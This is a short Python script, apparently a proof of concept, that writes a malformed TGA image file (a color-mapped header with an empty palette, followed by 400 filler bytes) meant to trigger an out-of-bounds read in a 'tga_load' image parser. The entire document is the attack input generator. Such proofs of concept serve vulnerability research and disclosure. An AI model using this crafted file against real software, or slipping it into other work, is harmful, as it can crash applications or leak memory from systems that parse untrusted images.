#!/usr/bin/env python
#tga_load out of bounds read

import struct

s=chr(0) #offset
s+=chr(1)#color type
s+=chr(1)#image type

s+=struct.pack('<H',0)#palette start
s+=struct.pack('<H',0)#palette len
s+=chr(8)#palette bits
s+=struct.pack('<H',0)#x_orig
s+=struct.pack('<H',0)#y_orig
s+=struct.pack('<H',1)#width
s+=struct.pack('<H',1)#height
s+=chr(32)#bits per pix
s+=chr(0)#inverted
s+=chr(1)
s+='a'*400
file('1.bin','wb').write(s)

